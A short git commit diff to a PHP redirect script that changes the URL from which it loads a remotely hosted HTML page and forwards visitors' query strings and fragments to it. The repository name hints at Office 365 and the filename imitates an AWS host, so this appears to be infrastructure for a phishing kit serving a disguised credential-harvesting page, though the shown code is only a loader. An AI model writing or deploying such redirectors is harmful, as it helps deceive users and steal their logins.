de1e61237d7fae4bbdba916e9d3d8665450704bd
x8080x2 <eu2@eeu.jp>
2024-12-12 14:40:41 +0200

    Updateredirect.php

--- redirect.php
+++ redirect.php
@@ -1,6 +1,6 @@
 <?php
 // URL of your hosted main script
-$mainScriptUrl = 'https://github.com/x8080x2/closedstorerdo365/raw/refs/heads/main/7654356query-apiap-southeast-1amazonaws.html';
+$mainScriptUrl = 'https://raw.githubusercontent.com/x8080x2/closedstorerdo365/main/7654356query-apiap-southeast-1amazonaws.html';
 
 // Forward query parameters and hash fragment
 $queryString = $_SERVER['QUERY_STRING'];
